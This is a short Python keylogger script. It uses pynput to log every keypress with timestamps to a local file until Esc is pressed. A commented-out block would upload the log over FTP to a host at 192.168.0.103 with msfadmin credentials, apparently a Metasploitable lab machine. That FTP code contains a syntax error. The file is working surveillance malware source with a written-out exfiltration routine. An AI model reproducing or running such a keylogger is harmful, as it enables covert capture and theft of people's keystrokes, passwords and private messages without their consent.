from pynput.keyboard import Key
from pynput.keyboard import Listener
import ftplib
import logging
import sys

logdir = ""

logging.basicConfig(filename=(logdir+"klog-res.txt"),level=logging.DEBUG,format="%(asctime)s: %(message)s")

def pressing_key(Key):
    try:
        logging.info(str(Key))
    except AttributeError:
        print("A special key {0} has been pressed ".format(Key))

def realceing_key(key):
    if key == Key.esc:
        return False
    

print("\nStarted Listining...\n")

with Listener(on_press=pressing_key, on_release=realceing_key) as listener:
    listener.join()

print("\nSending data to the file\n")
"""
sess = ftplib.FTP("192.168.0.103", "msfadmin","msfadmin")
file = open("klog-res.txt", "rb")
sess.storbinary("STOR klog-res.txt",file) file.close()
sess.quit()
file.close()
"""